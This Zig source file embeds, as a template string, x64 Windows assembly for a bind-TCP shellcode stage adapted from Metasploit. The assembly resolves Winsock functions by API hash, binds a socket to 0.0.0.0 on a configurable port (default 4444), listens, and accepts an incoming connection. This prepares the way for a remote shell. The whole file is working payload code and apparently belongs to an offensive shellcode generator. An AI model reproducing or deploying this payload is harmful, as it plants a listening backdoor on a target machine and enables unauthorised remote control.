// Reference:
// https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_bind_tcp.asm
pub const asm_code =
    \\bind_tcp:
    \\  ; Setup the structure we need on the stack...
    \\  mov r14, 'ws2_32'
    \\  push r14                ; Push the byte 'ws2_32', 0, 0 onto the stack.
    \\  mov r14, rsp            ; Save pointer to the "ws2_32" string for LoadLibraryA call.
    \\  sub rsp, 408+8          ; Alloc sizeof(struct WSAData) bytes for the WSAData structure (+8 for alignment)
    \\  mov r13, rsp            ; Save pointer to the WSAData structure for WSAStartup call.
    \\  mov r12, {LOCAL_ADDR}   ; Default: 0x000000005C110002 <- `hex(0.0.0.0 (00.00.00.00)) = 0x00000000` + `hex(4444) = 0x115C` + `AF_INET = 0x0002`
    \\  push r12                ; Bind to 0.0.0.0 family AF_INET and port 4444
    \\  mov r12, rsp            ; Save pointer to sockaddr_in struct for bind call
    \\
    \\  ; Perform the call to LoadLibraryA...
    \\  mov rcx, r14            ; Set the param ('ws2_32') for the library to load.
    \\  mov r10d, 0x0726774C    ; hash("kernel32.dll", "LoadLibraryA")
    \\  call rbp                ; Call LoadLibraryA("ws2_32");
    \\
    \\  ; Perform the call to WSAStartup...
    \\  mov rdx, r13            ; Second param is a pointer to this struct
    \\  push 0x0101
    \\  pop rcx
    \\  mov r10d, 0x006B8029    ; hash("ws2_32.dll", "WSAStartup")
    \\  call rbp                ; Call WSAStartup(0x0101, &WSAData);
    \\
    \\  ; Perform the call to WSASocketA...
    \\  push rax                ; If we succeed, rax will be zero, push zero for the flags param.
    \\  push rax                ; Push null for reserved parameter
    \\  xor r9, r9              ; We don't specify a WSAPROTOCOL_INFO structure
    \\  xor r8, r8              ; We don't specify a protocol
    \\  inc rax
    \\  mov rdx, rax            ; Push SOCK_STREAM (= 0x1)
    \\  inc rax
    \\  mov rcx, rax            ; Push AF_INET (= 0x2)
    \\  mov r10d, 0xE0DF0FEA    ; hash("ws2_32.dll", "WSASocketA")
    \\  call rbp                ; Call WSASocketA(AF_INET, SOCK_STREAM, 0, 0, 0, 0);
    \\  mov rdi, rax            ; Save the socket for later
    \\
    \\  ; Perform the call to bind...
    \\  push byte 16
    \\  pop r8                  ; Length of the sockaddr_in struct (we only set the first 8 bytes as the last 8 are unused)
    \\  mov rdx, r12            ; Set the pointer to sockaddr_in struct
    \\  mov rcx, rdi            ; socket
    \\  mov r10d, 0x6737DBC2    ; hash("ws2_32.dll", "bind")
    \\  call rbp                ; bind(s, &sockaddr_in, 16);
    \\
    \\  ; Perform the call to listen...
    \\  xor rdx, rdx            ; backlog
    \\  mov rcx, rdi            ; socket
    \\  mov r10d, 0xFF38E9B7    ; hash("ws2_32.dll", "listen")
    \\  call rbp                ; listen(s, 0);
    \\
    \\  ; Perform the call to accept...
    \\  xor r8, r8              ; We set length for the sockaddr struct to zero
    \\  xor rdx, rdx            ; We don't set the optional sockaddr param
    \\  mov rcx, rdi            ; listening socket
    \\  mov r10d, 0xE13BEC74    ; hash("ws2_32.dll", "accept")
    \\  call rbp                ; accept(s, 0, 0);
    \\
    \\  ; Perform the call to closesocket...
    \\  mov rcx, rdi            ; the listening socket to close
    \\  mov rdi, rax            ; Swap the new connected socket over the listening socket
    \\  mov r10d, 0x614D6E75    ; hash("ws2_32.dll", "closesocket")
    \\  call rbp                ; closesocket(s);
    \\
    \\  ; Restore RSP so we don't have any alignment issue with the next block...
    \\  add rsp, ((408+8) + (8*4) + (32*7)) ; Cleanup the stack allocation
;
